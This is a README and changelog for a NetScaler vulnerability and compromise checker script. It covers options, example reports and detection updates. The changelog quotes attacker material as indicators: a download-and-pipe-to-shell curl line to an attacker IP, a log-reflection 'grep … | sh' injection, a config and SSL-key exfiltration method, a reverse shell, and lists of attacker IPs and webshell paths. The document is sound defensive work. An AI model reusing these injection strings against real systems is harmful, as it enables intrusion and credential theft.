- **[NetScaler: run and get IoC scripts with Console](https://www.julianjakob.com/netscaler-run-get-ioc-scripts-with-console/)** by Julian Jakob: two NetScaler Console configuration-job templates, one uploads and runs the script on the selected instances, the other downloads the results as one `.tgz`. Works with this checker; use `--summary` so each report ends with the result line.
- **[netscaler-ioc-bulk-check](https://github.com/FerroqueSystems/netscaler-ioc-bulk-check)** by Richard Faulkner, Ferroque Systems: a PowerShell runner (PuTTY `plink`/`pscp`) that uploads the script over SSH, checks its SHA-256, runs it and downloads the report into a dated folder, with a `summary.csv`. Built for Gotham Technology Group's check; Richard offered to extend it to this checker.

### Offline, against an exported config

```sh
sh ctx697096_check.sh fw01-ns.conf

# many appliances
for f in *.conf; do echo "=== $f"; sh ctx697096_check.sh "$f"; done > report.txt
```

The build number is read from the first line of `ns.conf` (`#NS14.1 Build 73.37`). `--ioc` only works on the appliance.

### Options

| Option | Description |
|---|---|
| `<path>` | Config file to check (default `/nsconfig/ns.conf`) |
| `--ioc` | Check for compromise: all public IoCs, attack traffic before/after the fix, log retention (appliance only). **Default on the appliance since v1.15**; still accepted |
| `--no-ioc` | (v1.15) Skip the compromise check: build, preconditions, partitions and upgrade risks only. The verdict then says "NOT checked for compromise" and `--summary` shows `compromise=not_checked` |
| `--partition <ns.conf>` | Check a single admin partition config |
| `--out <file>`, `--out=<file>` | Also save the report as plain text (no colours, attacker text defanged), e.g. for the change record |
| `--summary` | Short summary on screen (one result line, red findings, count of `[CHECK]` items, verdict); the full report is saved on the appliance in `/var/tmp/ctx697096_<host>_<date>_<time>.txt`, or the `--out` file. Made for NetScaler Console configuration jobs and runs across many appliances. The result line is also the last line of the report |
| `--hide-ip` | (v1.15) The second header line ("Appliance: …") and the `--summary` result line show `NSIP hidden` / `nsip=hidden` instead of the appliance IP. Use it for screenshots and reports you share outside your team |
| `--no-banner` | (v1.15) No start banner. The banner is only shown when you run the checker by hand in a terminal, and never ends up in a saved report |
| `--days N` | How far back the "files changed recently" checks look, in the web folders and in `/`, `/var`, `/tmp` and `/var/tmp`. Default 30 days (the whole campaign so far); e.g. `--days 60` to look further back |
| `--fixdate "YYYY-MM-DD HH:MM"` | Optional: set when the fixed build started running, if the automatic date is wrong. Normally not needed |
| `--version` | Show the script version |
| `-h`, `--help` | Show help |

### Environment variables

The same settings can be given as environment variables, e.g. in a Console job: `CTXCHK_DAYS=60 sh ctx697096_check.sh --summary`.

| Variable | Same as / purpose |
|---|---|
| `CTXCHK_DAYS=N` | `--days N` |
| `CTXCHK_FIXDATE="YYYY-MM-DD HH:MM"` | `--fixdate` |
| `CTXCHK_NOBANNER=1` | `--no-banner` |
| `CTXCHK_HIDEIP=1` | `--hide-ip` |
| `CTXCHK_WEBDIRS="dir dir ..."` | Web folders searched for recently changed files (default `/var/netscaler/logon /netscaler/ns_gui /var/vpn`) |
| `CTXCHK_BOOTTIME=<epoch>`, `CTXCHK_BOOTFILE=<path>` | Testing only: override the boot time and the running kernel file |

`CTXCHK_CHILD` and `CTXCHK_PROGRESS` are set by the script itself for `--out` / `--summary`; do not set them.

### Output labels

| Label | Meaning |
|---|---|
| `[AFFECTED]` | Precondition met on a **vulnerable** build: act now |
| `[met/fixed]` | Precondition met, but the build is **fixed**. It shows what was exposed before the upgrade. No action needed |
| `[fixed]` | The running build includes the CTX697096 fixes (or, on the CVE-2026-88779 line, the CVE-2026-88779 fix) |
| `[not met]` | CVE precondition not met |
| `[OK]` | Check clean or expected (upgrade risks, `--ioc`) |
| `[SUSPECT]` | Red, `--ioc` only: a compromise indicator (a command ran on the box), attack traffic before the fix, or a web file changed on its own that contains code-like content. Investigate |
| `[CHECK]` | Review manually |

### Exit codes

| Code | Meaning |
|---|---|
| `0` | Fixed build, no follow-up flagged |
| `1` | Fixed build, but follow-up needed (e.g. Enhanced ISN, NS variables, SAML, IoC hits) |
| `2` | **Vulnerable**: upgrade now. Also when SAML is configured and the build is below the CVE-2026-88779 fixed build, and (v1.14) **COMPROMISED**: `--ioc` found compromise indicators, on a fixed or a vulnerable build |
| `3` | Could not read the config or determine the build |

---

## Example output

Since v1.15 the compromise check runs by default on the appliance, so a normal run shows the build, the preconditions **and** the IoC sweep. Names and IPs below are changed; the start banner (terminal only) is left out.

**On a patched appliance** (`sh ctx697096_check.sh`, shortened):

```text
CTX697096 + CTX697174 precondition check v1.15 (indicators up to 8 Oct 2026)
Appliance: ns01  -  NSIP 10.0.0.10  -  config /nsconfig/ns.conf  -  2026-10-08 10:44
============================================================================
Build
  [fixed]    Running 14.1-73.41 - includes the CTX697096 and CVE-2026-88779 fixes.

Preconditions (CTX697096)
  (build is fixed - [met/fixed] lines show exposure before the upgrade; only CVE-2026-88778 needs a config change)
  [met/fixed] CVE-2026-88771 (RCE, 9.5, EXPLOITED) - applies to ALL deployments, no workaround - mitigated by fixed build
  [met/fixed] CVE-2026-88772 (RCE, 9.5, EXPLOITED) - DTLS enabled - mitigated by fixed build:
  ...
  [not met]  CVE-2026-88778 - TCP vservers present, Enhanced ISN Generation ENABLED

CVE-2026-88779 (CTX697174, SAML - separate bulletin, not part of CTX697096)
  [fixed]    CVE-2026-88779 - SAML configured (samlAction=1 samlIdPProfile=0), build includes the fix

Upgrade risk
  [OK]       No 13.1-64.23 upgrade risk

Hardening (recommended - does not change the verdict)
  [TIP]      IP Reputation is not used - recommended: drop requests from known-bad IPs (scanners, botnets) before they reach the Gateway:

IoC sweep (public indicators - use together with the official Citrix IoC scan)
  [OK]       Fixed build running since 2026-09-27 16:29 (install time of ns-14.1-73.37.gz, the first fixed build still in /flash) - exposure window ended here
  [OK]       Last boot 2026-10-04 11:31 (after the fixed-build install)
  [CHECK]    ns.log keeps only ~24 hours of history (oldest file 2026-10-06 21:00)
             | Log-based checks cannot see further back. Forward logs to a SIEM / syslog server.
  ... [1/6] Files: web folders, temp folders, known hashes               0:00
  [OK]       45 web files rewritten together on 2026-10-03 16:25 - whole theme/system rewrite (expected)
  [OK]       Web files rewritten together across folders or with their whole folder - content checked, nothing suspicious (system / theme / EULA save):
  ... [2/6] Persistence: cron, startup files, processes                  0:01
  ... [3/6] Logs: HTTP errors, VPN clients, login-page injection         0:02
  ... [4/6] Logs: 131 attacker IPs, 17 domains, ~93 scanners             0:14
  ... [5/6] Logs: webshell requests, payloads, shell history             0:16
  [CHECK]    Exploitation traffic for CVE-2026-88771/88772 in the logs - all dated lines are AFTER the fixed build started running (2026-09-27 16:29):
             | known exploitation IP 203.0.113.55 (2 line(s)):
             | [after fix] 203.0.113.55 -> 10.0.0.90 - - [28/Sep/2026:21:48:58 +0000] "GET /logon/themes/Default/receiver.min.d0f4da26353fbbc4.css HTTP/1.1" 404 236 ...
             | Attempts after the fix - before 2 Oct, or after the CVE-2026-88779 fix - could not run commands. A 404 on a canary/alias check confirms it failed.
  ... [6/6] Live state, users and saved configs                          0:17
  [OK]       No local system users besides nsroot in ns.conf (also check 'show system user' for unsaved ones)
  [OK]       No Perl scripts, processes or start-up lines outside NetScaler's own files

Done in 18s (expected 5s-22s). Checker v1.15 checked 131 attacker IPs, 17 domains, 38 hashes and all public indicators up to 8 Oct 2026.
============================================================================
VERDICT: fixed build, but follow-up items above need attention.
```

**On a brand-new appliance** that never ran a vulnerable build, the same run ends green:

```text
  [OK]       Short log history (ns.log, notice.log, httpaccess-vpn.log) - fine here: this appliance never ran a vulnerable build
  ...
  [OK]       No public CVE-2026-88771/88772 indicators (webshells, dropped files, persistence, 131 known attacker IPs + GreyNoise scanners, probe/canary/scanner strings)
  [OK]       No Perl scripts, processes or start-up lines outside NetScaler's own files

Done in 8s (expected 5s-20s). Checker v1.15 checked 131 attacker IPs, 17 domains, 38 hashes and all public indicators up to 8 Oct 2026.
============================================================================
VERDICT: fixed build, no follow-up flagged.
If this box was internet-facing before patching, also run the official Citrix IoC scan.
```

**With `--summary`** (one result line on screen, full report saved):

```text
CTX697096 checker 1.15: host=ns01 nsip=10.0.0.10 build=14.1-73.41 status=FIXED isn=n/a compromise=no targeted=yes,after_fix_only saml=sp cve88779=fixed verdict=FOLLOW_UP runtime=18s
  2 [CHECK] item(s) to review in the full report:
    - ns.log keeps only ~24 hours of history (oldest file 2026-10-06 21:00)
    - Exploitation traffic for CVE-2026-88771/88772 in the logs - all dated lines are AFTER the fixed build ...
VERDICT: fixed build, but follow-up items above need attention.
Full report on this appliance: /var/tmp/ctx697096_ns01_20261007_2144.txt (attacker text defanged)
```

**When the compromise check did not run**, the verdict says so. With `--no-ioc` on the appliance:

```text
VERDICT: fixed build - but NOT checked for compromise (--no-ioc).
Was this box hacked before the fix? Run:  sh ctx697096_check.sh --summary
```

**Offline, against an exported config** of a vulnerable appliance (`sh ctx697096_check.sh fw01-ns.conf`, no IoC sweep possible):

```text
CTX697096 + CTX697174 precondition check v1.15 (indicators up to 8 Oct 2026)
Appliance: admin-pc  -  NSIP 10.0.0.1  -  config fw01-ns.conf  -  2026-10-08 13:21
============================================================================
Build
  [AFFECTED] Running 13.1-58.21 - VULNERABLE. Fixed in 13.1-64.24 or later - install 13.1-64.28 (also fixes CVE-2026-88779).

Preconditions (CTX697096)
  [AFFECTED] CVE-2026-88771 (RCE, 9.5, EXPLOITED) - applies to ALL deployments, no workaround
  [AFFECTED] CVE-2026-88772 (RCE, 9.5, EXPLOITED) - DTLS enabled:
             | add vpn vserver gw1 SSL 10.0.0.1 443 -Listenpolicy NONE
  ...
  [AFFECTED] CVE-2026-88778 (TCP ISN prediction, 8.8) - TCP vservers present, Enhanced ISN not enabled in config

CVE-2026-88779 (CTX697174, SAML - separate bulletin, not part of CTX697096)
  [AFFECTED] CVE-2026-88779 (SAML memory overflow/DoS, 8.7, targeted attacks) - SAML configured (samlAction=1 samlIdPProfile=0) and build below 13.1-64.28. Upgrade to 13.1-64.28 or later.

============================================================================
(Compromise NOT checked: offline config - run on the appliance. Upgrading does not remove an attacker who is already in.)
VERDICT: VULNERABLE - upgrade now. The fixed build covers all eight CVEs in CTX697096; CVE-2026-88771 and -88772 are exploited in the wild.
```

---

## Enabling Enhanced ISN Generation (CVE-2026-88778)

```text
switch ns partition <partition>        # repeat for each admin partition
set ns tcpparam -enhancedISNgeneration ENABLED
switch ns partition default
set ns tcpparam -enhancedISNgeneration ENABLED
save ns config -all
show ns tcpparam | grep "Enhanced ISN Generation"
```

GUI: **Configuration > System > Settings > Change TCP Parameters**, tick **Enhanced ISN Generation**, click **OK** and save the config.

---

## Recommended order of work

1. **Preserve evidence.** Collect a support bundle and copy the logs off the appliance. Take a RAM capture if possible.
2. **Run the official Citrix IoC scan** (NetScaler Console or Citrix Support) **before** any reboot.
3. **Run this script** to see which preconditions apply and to plan the upgrade.
4. **Upgrade** to the fixed build (with SAML: the CVE-2026-88779 build, 14.1-73.41 / 13.1-64.28), and enable Enhanced ISN Generation.
5. **New cloud VPX?** As of 7 October the public Marketplace images in Azure (14.1-66.59), AWS (14.1-73.30, listing closed for new subscriptions) and Google Cloud (14.1-73.30 and older, FIPS 14.1-72.61) were all **below the fixed builds**. Deploy without a public IP, upgrade to 14.1-73.41 first, run the checker, then expose it.
6. **Reduce exposure:** block outbound traffic from NSIP/SNIP except what the NetScaler needs, and turn on [IP Reputation](https://docs.netscaler.com/en-us/citrix-adc/current-release/reputation/ip-reputation.html) to drop requests from known-bad IPs (`enable ns feature reputation`, a responder policy with `CLIENT.IP.SRC.IPREP_IS_MALICIOUS` and action `DROP`, bound to the Gateway/LB vservers). It needs a Premium licence and HTTPS from the NSIP to `api.bcss.brightcloud.com`. It does not replace the upgrade.
7. If anything suspicious was found, **treat the appliance as compromised** and follow [CTX694799 – Steps to take if NetScaler ADC is suspected to be compromised](https://support.citrix.com/external/article/CTX694799/steps-to-take-if-netscaler-adc-is-suspec.html).

---

## Changelog

- **v1.15** (2026-10-08): **WHIPSHOT / SLAPSHOT scanning (Lupovis).**
  - Lupovis (5 October) shows that scanning for these webshells started before Mandiant published them, and that since 4 October a 10-step scan asks for randomly named variants on every target. Scanning is not compromise: these requests are listed as **targeted**, with the source IPs.
  - **New probe check:** requests for `receiver.deb` or a random 12-character `.deb` in `/logon/LogonPoint/custom/`.
  - **`g` suffix:** requests for `receiver.min.<hex>g.css` and `receiver.v2.min.<hex>g.css` (the scan adds a `g` to test whether a CDN or WAF answers from its cache) now count as exploit strings. In a test set of real logs, such requests from 28 and 29 September were missed by v1.14.
  - **Log-reflection (Lupovis, 7 October):** two actors park a whole shell script in the User-Agent of a GET request, tagged `<tag>:<script>`, so it is written to `/var/log/httpaccess*`. The CVE-2026-88771 injection then only carries `grep <tag>: /var/log/htt* | sed … | sh` and runs the script from the log, so filters that inspect the login field never see the payload. New **targeted** check for plain-text shell scripts in a tagged User-Agent (the base64 forms `INDEX:` and `K:` were already covered), `/var/log/htt` in an injection counts as an exploit string, and the report links each injected tag to the staged requests and their source IPs. If the shell audit log shows the command ran, it is reported as compromise, as before. The second actor base64-encodes the script (`<tag>:<base64>`): those values are decoded and the decoded command is shown. Lupovis also confirms that one actor's extracted script is the config and SSL-key theft payload detected since v1.14 (ns.conf and keys in a random `.css` in LogonPoint, sent to port 8877).
  - **"NetScaler C2" framework (SOCRadar, 7 October):** an automated tool that injects `curl${IFS}-sk${IFS}45.143.130[.]195:8899/s/<id>|sh` through CVE-2026-88771 and installs a polling agent with HTTP and DNS command channels. **45.143.130.195** added; the agent file `/tmp/.nsagent` (or a running `.nsagent` process) is reported as **compromise**; the C2 paths `:8899/s/`, `/a/`, `/p/`, `/c/`, `/r/`, the DNS beacon `.p1.oob.` and `nslookup${IFS}` count as exploit strings.
  - **Compromise check on by default:** on the appliance, the IoC sweep now runs without `--ioc` (field case: a customer ran the build check alone and read "fixed build" as "not hacked"). `--no-ioc` skips it; the verdict then says **"NOT checked for compromise"** and `--summary` shows `compromise=not_checked verdict=OK_IOC_NOT_RUN`. An exported config checked offline says the same. `--ioc` is still accepted.
  - **Version on screen:** the first line of every run shows the checker version and the indicator date (`precondition check v1.15 (indicators up to 8 Oct 2026)`), and so does the "Done in" line. When the copy is more than 7 days older than today, a yellow line (also in `--summary`) points to GitHub for a newer version.
  - **No false COMPROMISED from saved reports (field case):** the content checks in `/tmp`, `/var/tmp`, `/` and `/var` (SLAPSHOT marker, Platypus bootstrap, one-line webshell, `uid=` output, EPA batch file, download-and-run scripts) now skip saved checker reports under any file name (recognised by their first line), the checker itself and other triage scripts. A v1.14 report saved as `/var/tmp/v114.txt` had been flagged as a SLAPSHOT marker and a Platypus bootstrap script.
  - **No false "payload reached a shell":** NetScaler's own boot command `NSPPE_CPUID_OVERRIDE_NEEDED=$(sysctl …)` in the shell audit log no longer counts as attacker trigger text; the trigger is now `pitboss`, `unexpectedly died` or `NSPPE(-n);`.
  - **Theme folders:** the WHIPSHOT/SLAPSHOT scans also request `/logon/themes/<theme>/receiver(.v2).min.<hex>[g].css`, `.receiver` and `receiver.deb` (seen in the field); these are now matched as well as `LogonPoint/custom`. **23.234.80.205** added (field report: LogonUISimple webshell-alias probes, 7 Oct).
  - **Perl inventory:** a `[CHECK]` lists Perl scripts, processes, start-up lines and `perl -e` / `| perl` shell history outside NetScaler's own files (field case: another IoC scanner reported only a "Perl" finding). Known bad Perl stays red.
  - **Hardening tip:** a new "Hardening" section recommends IP Reputation when no responder/WAF policy uses it. It never changes the verdict or the exit code.
  - **Fewer false alarms:** the tunnel-process check (`python` with `base64`) skips the checker's own `grep`/`perl`/`sh`/`awk`/`sed` processes, so two checkers running at the same time (e.g. a Console job and a manual run) no longer report each other as COMPROMISED.
  - **Brand-new appliance stays green (field case: a new VPX on 14.1-73.41, no config, no internet, showed six [CHECK] lines):**
    - **Short logs:** when every kernel in `/flash` and every build in `/var/nsinstall` has the fix, and no log, `nslog` file or saved `ns.conf` is older than the fixed kernel (3-hour margin), the box never ran a vulnerable build: "ns.log has no rotated files" / "keeps only ~25 hours" become one `[OK]`. One older log line or saved config, or one vulnerable kernel, brings the CHECKs back.
    - **Image and EULA rewrites:** 10 or more web files in 2 or more folders written within 60 seconds, or 80% or more of the files of one type in a folder (at least 5, e.g. 12 of 13 EULA language files), count as a system/theme rewrite. Their content is still checked; only a clean result changes from `[CHECK]` to `[OK]`. A changed `.php` stays red.
    - **NetScaler's own Perl:** `themes/EULA/eula_upgrade.pl`, the PAR cache of the GSLB sync (`/var/tmp/par-<hex>/cache-<hex>/`: `main.pl`, `syncgslbconfig.pl`, `GslbSync.pm`), `/var/perl5/` and Perl in the logon folders written by the same rewrite as the web files around it are no longer listed.
  - **LevelBlue THOR (customsnmpd reverse shell):** `main.py` overwrites `/var/python/bin/customsnmpd` with a small Python reverse shell to 45.141.21.130:443. That IP in the file = **COMPROMISED**; code in it that connects out and hands over a shell (`connect(` with `pty.spawn` or `dup2(...fileno`, plus `/bin/sh`) = `[CHECK]`. `whoami` and `tar` added to the command words searched in `ns.log` / `nsvpn.log`. All other indicators in LevelBlue's report (sources, payload hosts, hashes, `sec_monitor`, `/bin/sh` 6555, `.local_journal`, the httpd alias, `insight-new.js`, `xua.html`, `update_result_*.tgz`) were already covered since v1.10.
  - **Plain-language summary under "Exploitation traffic":** whether any webshell request found a file ("All 12 webshell request(s) were answered 404 - none of these webshell files exists on this box", or which ones got 200/206), and how many of the BEFORE-fix lines come from GreyNoise-tagged scanners. When all BEFORE-fix lines are scanner traffic, the "may have run" note is left out; other BEFORE-fix requests (up to 5) are printed right under the summary, so they are never hidden by a long list. A saved report (`--out`, `--summary`) contains the full "Exploitation traffic" list; on screen it is cut at 40 lines. The section stays red; the summary only explains it. Line counts in its heading now count each log line once, even when it is listed in two groups. The stock 1-byte `nsepa.deb` pre-check is not counted as a webshell request.
  - **IP Reputation tip, more precise:** besides finding responder / WAF policies that use IP Reputation, the Hardening section now checks in the saved config that the features they need are enabled (Reputation, plus Responder or AppFw) and that each policy is bound to a vserver or globally. Missing parts are shown with the command to fix them; when everything is in place it shows `[OK]` with where the policy is bound. The licence is not checked (that needs the CLI); the line shows `nscli -c "show ns license" | grep -i reputation`. It never changes the verdict.
  - **Which appliance:** the header now has a second line, `Appliance: <host>  -  NSIP <ip>  -  config <file>  -  <time>`, so a screenshot or report always shows which node it came from (HA pairs, new boxes all called "ns"). The NSIP is read from `set ns config -IPAddress` in the checked config, so it also works for an exported config. `--summary` adds `nsip=` to the result line. `--hide-ip` shows `hidden` instead, for screenshots and reports you share. The first header line is unchanged.
  - **Start banner:** a small banner when you run it by hand in a terminal: "NetScaler" in green ASCII letters, next to it **CVE CHECK + IoC SWEEP** ("am I fixed? / was I hacked?"), the version, indicator date and GitHub link. It fits an 80-column window. It goes to stderr, so it is never part of a saved report, and it is skipped for `--summary`, `--out`, pipes, Console jobs and with `--no-banner`.
  - **Production HA pair (7 October):** NetScaler's own `/netscaler/cfdgetstream`, a helper the web GUI starts for a moment as `nobody`, is no longer listed as an unexpected `nobody` process (only when the file is owned by root and not writable by group or others). When `httpd.conf` changed within 5 minutes of a packet-engine restart, the report now says so on the `httpd.conf` line ("together with a packet-engine restart at …"); both stay a `[CHECK]`, because a restart can also be a CVE-2026-88772 crash.
  - **Huntback.io (7 October, ten days of decoy telemetry):** 16 more attacker IPs, and four addresses moved from the scanner group to the attacker IPs because Huntback shows them injecting commands (172.247.44.85, 23.234.74.48, 176.65.148.54, 137.220.53.135). Several are Tor exits: on their own they only count as "targeted". The tunnel services `pinggy.net` and `serveousercontent.com` added as domains. **Compromise:** the `ns_helper` implant (`/var/vpn/ns_helper`, `/nsconfig/.ns_helper`), the dropper stage `/tmp/.p` and any hidden `.php` file in the web folders (e.g. `LogonPoint/custom/.x.php`). `Nx_*.html` counts as a payload canary like `nx_verify.html`; `ns_helper`, `free.pinggy.net`, `serveousercontent.com` and `/Nx_*.html` count as exploit strings. The `fefypa:` / `fdylo9:` log-channel tags were already caught by the base64 User-Agent check. **New targeted check:** the attack text (`pitboss` / `unexpectedly died` / `NSPPE` with `;` or `${IFS}`) in **any** HTTP request, also a GET with the payload in the User-Agent; before, only the five login pages and `ns.log` were searched (Huntback: 14 injections came in the User-Agent, incl. the ns.conf copy). The files these requests try to write, including the target of `cp` / `mv`, are checked like those from `ns.log`: if one exists, the verdict is COMPROMISED. `NX_*.html` and `Nx_*.html` are matched regardless of case.
  - **Beazley Security Labs (BSL-A1216, updated 4 October; via Gotham Technology Group):** three exploit-delivery servers added (104.207.47.54, 104.207.46.202, 104.207.32.77). **Gotham Technology Group (shared with permission):** four more SLAPSHOT / WHIPSHOT kit hashes. **Totals: 131 attacker IPs, 17 domains, 38 hashes.**
  - **New compromise check:** a `.deb` file in the login-page theme folder (`LogonPoint/custom`, `logon/themes`), where SLAPSHOT keeps a webshell as `receiver.deb`. The theme folder never holds packages of its own.
- **v1.14** (2026-10-06): **config and SSL-key theft payload.**
  - **New compromise check:** a payload seen in the field writes `ns.conf` and every `/nsconfig/ssl/*.key` (marked `===CONF:` / `===KEY:`) into a random 6-character `.css` in `/var/netscaler/logon/LogonPoint`, sends it with `curl --data-binary` to port 8877 and then downloads the `.css`. Any file in the web folders holding config dumps or private keys is now reported as a compromise, with the advice to rotate all keys, certificates and passwords.
  - **Pick-up requests:** requests for a random 6-character `.css` directly in `/logon/LogonPoint/` are listed (404 = the file was never written, the attempt failed); an HTTP 200 is reported as a compromise (the file was downloaded).
  - **Attack text:** `curl --data-binary @<file>` and `:8877/` count as exploit strings.
  - **81.94.239.8** added (exfiltration server of this payload, field report): **106 attacker IPs**.
  - **Clear verdict on compromise:** when `--ioc` finds compromise indicators, the last line now reads **"VERDICT: COMPROMISED - follow CTX694799"** (fixed build) or **"VERDICT: COMPROMISED and VULNERABLE - follow CTX694799 first"** (vulnerable build), with exit code 2. Before, a fixed build said "follow-up items" and a vulnerable build said "upgrade now" - an upgrade before preserving evidence wipes `/tmp` and running processes. The `--summary` line keeps `status=FIXED` / `VULNERABLE` for the build and `verdict=COMPROMISED`.
  - **PHP webshells and setuid backdoors outside the known places (PR #4, thanks to feiglein74):** from a field case where Citrix's own IoC scan found an old webshell (`LogonPoint/uiareas/linux/gnuplot.php`, CVE-2023-3519 wave) and a setuid backdoor (`/var/rgroupadd`) that the checker missed. Now reported as compromise: any `.php`/`.phtml` under `/var/netscaler/logon` and `/var/vpn`; one-line webshells (`$_POST['x']($_POST['y'])`); PHP files in the Apache error log that ran ("PHP Warning/Fatal in <file>") or still exist, with first and last date (only-blocked scanner requests for non-existing names are listed as OK); setuid/setgid programs (ELF or script) under `/var`, `/tmp`, `/nsconfig`, `/flash`, `/home`, `/root`; files an injection drops in the web folders that were downloaded with HTTP 200. POST requests to a PHP name count as webshell use when that file exists or ran; otherwise they are a yellow hunting lead (scanners POST to random names too).
  - **Fewer false alarms on payload targets (PR #5, thanks to feiglein74):** a payload that writes to a file every appliance has (e.g. appends to `/etc/httpd.conf`) no longer counts as "the command ran". Skipped: `/etc`, `/var/log`, `/bin`, `/sbin`, `/usr` and the stock files `ns.conf`, `httpd.conf`, `rc.netscaler`, `nsbefore.sh`, `nsafter.sh` and `crontab` under `/nsconfig` and `/flash/nsconfig`; a new file there (e.g. `/nsconfig/x.sh`) still counts. `{IFS}` without `$` is decoded too.
- **v1.13** (2026-10-05): **CVE-2026-88779 is on CISA's KEV list, plus new hunting checks.**
  - **CISA KEV:** CISA added CVE-2026-88779 to its Known Exploited Vulnerabilities catalog on 4 October (US federal deadline 7 October). A SAML appliance below the fixed build now also says so, and reminds you that a honeypot patched for CTX697096 ran downloaded malware (Kevin Beaumont), so run with `--ioc` and do not treat it as DoS only.
  - **SAML probe hunting (Lupovis, 4 October):** new `[CHECK]` for the User-Agent `probe/1` and very long requests to `/saml/login` or `/cgi/samlauth` in the HTTP logs, with source IPs, dated before/after the fix. Lupovis saw such a probe on 17 September, before CVE-2026-88779 was public (a ~2.8 KB SAMLRequest that inflates to 62 KiB of padding and binary). A hunting lead, never red on its own.
  - **Huntback.io decoys (4 October):** five more IPs that sent the CVE-2026-88771 `NX-CVE-OK` / `nx_verify.html` injection check (138.199.60.22, 138.199.60.36, 146.70.199.170, 146.70.211.157, 23.162.8.173, 104 attacker IPs at the time). Randomly named `*.receiver` webshells in the web folders are now reported as a compromise, not only `.ctxs.receiver` and `.slap.receiver`, and requests for any `*.receiver` file in LogonPoint count as webshell probing. A webshell hit now also says that upgrading does not remove it.
  - **From Gotham Technology Group's 5 October update (shared with permission):** 138.199.60.5 added as an attacker IP (sent CVE-2026-88779 crash payloads to `/saml/login` and `/cgi/samlauth` on 5 October; now **105 attacker IPs**). New yellow hunting lead for requests from 138.199.60.0/24 (hosting/VPN range used throughout the SAML attack) and four sources that sent `GET /saml/login` before disclosure (38.60.206.53, 38.60.212.144, 149.102.254.17, 130.94.19.84).
  - **Fix: admin config commands no longer count as attack lines.** NetScaler logs every CLI command in ns.log as `CMD_EXECUTED`. After applying a mitigation batch (for example Gotham's ACLs and attack-string pattern set), lines like `add ns acl … -srcIP = 62.133.62.80` or `bind policy patset … "${IFS}"` were reported in red as attacker IPs, attack domains or injection attempts. Configuration commands are now ignored; failed NITRO/API logins (`Command "login …"`) still count, because their user name can carry the injection.
  - **Sliver implant files (via PitScaler.com):** `citrix3.bad` in `/var/tmp`, `/tmp`, `/var/core`, `/var/netscaler` or `/nsconfig` is reported as a compromise, and so is `/var/tmp/.host` when it is an executable (ELF). Any other `/var/tmp/.host` is a `[CHECK]` only, because the source also lists a macOS sandbox path. The implant's hash was already checked since v1.12.
  - **Fewer false alarms on custom themes:** links alone in a theme's language files (`themes/<name>/resources/*.xml`) and `plugins.xml` are no longer red. Both hold links by design. Script tags, `eval`, `fetch` and similar in those files are still reported as suspicious. Found on a production run.
  - **Injection attempts: who sent them, and did they run?** For every login-injection attempt found, the checker now lists the download hosts named in the payloads (defanged, for your firewall/DNS search), the likely source IP (a `Client_ip` field in the line, or logon requests in the HTTP access logs within 5 seconds of each attempt; a different timezone in ns.log is detected automatically), and checks the shell audit logs (`sh.log`, `bash.log`, CLI `shell_command`) for the payload in a shell command - a hit is reported as a compromise. Read/search commands by an admin (grep, cat …) do not count, and it says when the shell logs do not reach back to the first attempt. Idea from the GEIGER log analysis by Patrick Wagner in Manuel Winkel's (Deyda) triage script; own implementation.
- **v1.12** (2026-10-04): **CVE-2026-88779 (CTX697174): the SAML attack has a fix.**
  - **New CVE-2026-88779 check on every run (also without `--ioc`).** SAML configured (`samlAction` or `samlIdPProfile`) and the build below 14.1-73.41 / 13.1-64.28 / 14.1-73.41 FIPS / 13.1-37.282 FIPS/NDcPP: `[AFFECTED]`, verdict `VULNERABLE to CVE-2026-88779 (SAML)` and exit code 2, also when the CTX697096 fixes are in place (Citrix: upgrade again). At or above those builds: `[fixed]`. No SAML: not affected. The notes give Citrix's interim mitigation (Global Deny List signatures through NetScaler Console, or the responder policy from Citrix Support) and the commands to verify Global Deny List. The `--summary` line has a new field `cve88779=vulnerable|fixed|n/a|unknown` and verdict `VULNERABLE_CVE-2026-88779`; `status=` stays the CTX697096 status. The build line now recommends the CVE-2026-88779 build.
  - **"May have run" ends with the CVE-2026-88779 fix.** Injection lines from 2 October count as "may have run" only until the CVE-2026-88779 build started running; later lines are targeted only. When you upgraded from an earlier fixed build (73.37 → 73.41), the CTX697096 fix date now comes from the oldest fixed kernel still in `/flash`, so the September attack lines are not wrongly marked `[BEFORE fix]`. Citrix classifies CVE-2026-88779 as denial of service; the checker still treats attempts in that window as possibly run, because commands were seen running on patched appliances.
  - **SAML mitigation coverage per vserver.** The SAML policy must be bound `-type AAA_REQUEST` on **every** Gateway and AAA vserver: the checker lists vservers without it, warns about `-type REQUEST` bindings (they never see sign-in traffic) and no longer counts a global binding as coverage (Gotham Technology Group, Deyda). Policies are also recognised when the rule sits in a named `add policy expression` (a reader's tip for keeping Citrix's policy easy to update) and when they cover the IdP endpoint `/saml/login`. On a fixed build, bound interim policies are reported as no longer needed. `nsaaad` crashes after the CVE-2026-88779 fix are counted separately; without SAML, crashes are reported as unrelated to CVE-2026-88779.
  - **From Gotham Technology Group's update (3–4 October, with its public sources):** 14 more hashes (the `/v` script of the 2 October attack, SAML-attack kit generations 2 and 3, the chisel tunnel, Sliver implants, a Perl payload; ThreatUnpacked, r/Citrix, Valhalla), also checked in `/nsconfig/.slap`; the kit's upload staging files `loot_*` and `agent.pl` cron lines (compromise); manual `ns_monuploadd_err.pl -WR` runs (CISA Sigma rule); the vulnerable copy of `ns_monuploadd_err.pl` on a fixed build; `chmod 6555` and `nsshutdown -R` in attack text; Beazley Security's second-wave IPs (51.158.203.95, 185.244.213.112, 158.94.211.205) and three hunting leads. Now **99 attacker IPs, 15 domains (`webhook.site`, `dnshook.site` added; `pyrlnk.cc` removed, an unregistered misspelling of `pylrk.cc` – thanks to Emil Ståhl, PitScaler.com, [issue #3](https://github.com/ThomasPoppelgaard/netscaler-ctx697096-checker/issues/3)) and 34 hashes**.
  - **Fixes from pull request #1 (thanks to feiglein74, tested on a production HA pair):** attacker IPs now match on address boundaries (`78.128.113.10` no longer matches `78.128.113.101`, also in the open-connection check); log lines without a readable date keep the targeted result red, because they could be from before the fix; syslog dates in the future are moved to the previous year (December logs read in January); `AddType application/x-httpd-php .php .deb` is caught (every extension on the line is checked; commented lines ignored); web files written during the upgrade window are still checked for strong webshell signs (`eval(base64_decode…)`, `NSC_TASS`, `passthru($_…)`); the "rewritten together" grouping only counts web files, so other files can't make a burst look bigger; URLs alone in `homeconfig.xml` are no longer flagged (it holds URLs by design); new IP `159.203.33.46` (99 attacker IPs).
  - **MPX firmware files.** `*_bios.bin`, `*_bmc.bin`, `bios_releases`, `bmc_releases` and `sum` in `/var/tmp` (staged by an MPX firmware install) are grouped as expected instead of listed as recently changed files.
